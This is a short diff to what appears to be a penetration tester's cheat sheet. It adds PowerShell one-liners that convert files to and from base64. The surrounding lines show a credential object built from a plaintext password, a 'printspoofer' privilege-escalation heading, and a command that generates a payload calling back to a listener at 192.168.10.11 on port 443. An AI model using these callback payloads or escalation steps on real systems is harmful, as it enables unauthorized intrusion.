@@ -381,6 +381,14 @@ $username = 'username'
 $password = 'password' | ConvertTo-SecureString -AsPlainText -Force
 $cred = New-Object System.Management.Automation.PSCredential -ArgumentList $username,$password
 ```
+powershell encode b64
+```
+# encode from binary file to base64txt
+powershell -C "& {$outpath = (Join-Path (pwd) 'out_base64.txt'); $inpath = (Join-Path (pwd) 'data.jpg'); [IO.File]::WriteAllText($outpath, ([convert]::ToBase64String(([IO.File]::ReadAllBytes($inpath)))))}"
+
+# decode from base64txt to binary file
+powershell -C "& {$outpath = (Join-Path (pwd) 'outdata2.jpg'); $inpath = (Join-Path (pwd) 'out_base64.txt'); [IO.File]::WriteAllBytes($outpath, ([convert]::FromBase64String(([IO.File]::ReadAllText($inpath)))))}"
+```
 printspoofer
 ```
 python3 makerunspace.py -a 64 -l 192.168.10.11 -p 443 -b PipePipe
